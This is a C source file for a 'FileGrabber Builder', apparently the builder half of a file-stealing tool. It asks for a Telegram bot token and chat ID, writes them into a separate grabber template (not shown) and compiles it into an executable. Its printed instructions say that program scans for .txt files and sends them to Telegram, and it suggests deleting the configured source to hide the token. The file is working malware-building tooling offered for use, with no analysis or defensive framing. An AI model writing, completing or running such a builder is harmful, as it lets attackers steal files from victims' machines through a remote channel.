#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_INPUT 256
#define TEMPLATE_FILE "filegrabber.c"
#define OUTPUT_FILE "filegrabber_configured.c"
#define EXECUTABLE_NAME "filegrabber.exe"

void print_banner() {
    printf("\n");
    printf("====================================================\n");
    printf("      FileGrabber Builder v1.0                     \n");
    printf("      Configure and Compile                        \n");
    printf("====================================================\n");
    printf("\n");
}

void trim_newline(char *str) {
    size_t len = strlen(str);
    if (len > 0 && (str[len-1] == '\n' || str[len-1] == '\r')) {
        str[len-1] = '\0';
    }
    if (len > 1 && (str[len-2] == '\n' || str[len-2] == '\r')) {
        str[len-2] = '\0';
    }
}

int validate_input(const char *input, const char *field_name) {
    if (strlen(input) == 0) {
        printf("Error: %s cannot be empty\n", field_name);
        return 0;
    }
    if (strchr(input, '"') != NULL) {
        printf("Error: %s cannot contain quotes\n", field_name);
        return 0;
    }
    return 1;
}

int configure_source() {
    char bot_token[MAX_INPUT];
    char chat_id[MAX_INPUT];
    
    printf("Configuration Setup\n");
    printf("----------------------------------------------------\n\n");
    
    // Get bot token
    printf("Enter Telegram Bot Token: ");
    if (!fgets(bot_token, sizeof(bot_token), stdin)) {
        printf("Error reading bot token\n");
        return 0;
    }
    trim_newline(bot_token);
    
    if (!validate_input(bot_token, "Bot Token")) {
        return 0;
    }
    
    // Get chat ID
    printf("Enter Telegram Chat ID: ");
    if (!fgets(chat_id, sizeof(chat_id), stdin)) {
        printf("Error reading chat ID\n");
        return 0;
    }
    trim_newline(chat_id);
    
    if (!validate_input(chat_id, "Chat ID")) {
        return 0;
    }
    
    printf("\n[OK] Configuration received\n\n");
    
    // Read template file
    FILE *template = fopen(TEMPLATE_FILE, "r");
    if (!template) {
        printf("Error: Cannot open template file '%s'\n", TEMPLATE_FILE);
        printf("Make sure filegrabber.c is in the same directory\n");
        return 0;
    }
    
    // Create output file
    FILE *output = fopen(OUTPUT_FILE, "w");
    if (!output) {
        printf("Error: Cannot create output file '%s'\n", OUTPUT_FILE);
        fclose(template);
        return 0;
    }
    
    printf("Generating configured source code...\n");
    
    // Process template and replace tokens
    char line[1024];
    int replaced_token = 0, replaced_chatid = 0;
    
    while (fgets(line, sizeof(line), template)) {
        // Replace BOT_TOKEN line
        if (strstr(line, "#define BOT_TOKEN") && !replaced_token) {
            fprintf(output, "#define BOT_TOKEN \"%s\"\n", bot_token);
            replaced_token = 1;
        }
        // Replace CHAT_ID line
        else if (strstr(line, "#define CHAT_ID") && !replaced_chatid) {
            fprintf(output, "#define CHAT_ID \"%s\"\n", chat_id);
            replaced_chatid = 1;
        }
        // Copy all other lines as-is
        else {
            fputs(line, output);
        }
    }
    
    fclose(template);
    fclose(output);
    
    if (!replaced_token || !replaced_chatid) {
        printf("Warning: Could not find all configuration placeholders\n");
        return 0;
    }
    
    printf("[OK] Configured source code created: %s\n\n", OUTPUT_FILE);
    return 1;
}

int compile_program() {
    printf("Compiling executable...\n");
    printf("----------------------------------------------------\n\n");
    
    // Check if gcc is available
    int check_gcc = system("gcc --version >nul 2>&1");
    if (check_gcc != 0) {
        printf("[ERROR] GCC compiler not found\n");
        printf("\nPlease install MinGW-w64 or TDM-GCC:\n");
        printf("  - MinGW-w64: https://www.mingw-w64.org/\n");
        printf("  - TDM-GCC: https://jmeubank.github.io/tdm-gcc/\n");
        printf("\nMake sure gcc is in your PATH\n");
        return 0;
    }
    
    // Compile the configured source
    char compile_cmd[512];
    snprintf(compile_cmd, sizeof(compile_cmd), 
             "gcc -o %s %s -O2 -s", 
             EXECUTABLE_NAME, OUTPUT_FILE);
    
    printf("Running: %s\n\n", compile_cmd);
    int result = system(compile_cmd);
    
    if (result != 0) {
        printf("\n[ERROR] Compilation failed with exit code: %d\n", result);
        return 0;
    }
    
    printf("\n[OK] Compilation successful!\n");
    printf("[OK] Executable created: %s\n", EXECUTABLE_NAME);
    return 1;
}

void print_instructions() {
    printf("\n");
    printf("====================================================\n");
    printf("              Build Complete!                      \n");
    printf("====================================================\n");
    printf("\n");
    printf("Your configured executable is ready:\n");
    printf("  >> %s\n\n", EXECUTABLE_NAME);
    printf("Next steps:\n");
    printf("  1. Run the executable: %s\n", EXECUTABLE_NAME);
    printf("  2. It will scan for .txt files and send them to Telegram\n");
    printf("  3. The configured source is saved in: %s\n", OUTPUT_FILE);
    printf("\n");
    printf("Security Note:\n");
    printf("  - The bot token is embedded in the executable\n");
    printf("  - Keep the executable secure\n");
    printf("  - Delete %s if you want to hide the token\n", OUTPUT_FILE);
    printf("\n");
}

void cleanup_prompt() {
    char response[10];
    printf("\nClean up temporary files? (y/n): ");
    if (fgets(response, sizeof(response), stdin)) {
        trim_newline(response);
        if (response[0] == 'y' || response[0] == 'Y') {
            if (remove(OUTPUT_FILE) == 0) {
                printf("[OK] Removed: %s\n", OUTPUT_FILE);
            }
        }
    }
}

int main() {
    print_banner();
    
    printf("This builder will help you create a configured version\n");
    printf("of FileGrabber with your Telegram credentials.\n\n");
    
    // Step 1: Configure
    if (!configure_source()) {
        printf("\n[ERROR] Configuration failed\n");
        printf("\nPress Enter to exit...");
        getchar();
        return 1;
    }
    
    // Step 2: Compile
    if (!compile_program()) {
        printf("\n[ERROR] Build failed\n");
        printf("\nPress Enter to exit...");
        getchar();
        return 1;
    }
    
    // Step 3: Success
    print_instructions();
    cleanup_prompt();
    
    printf("\nPress Enter to exit...");
    getchar();
    return 0;
}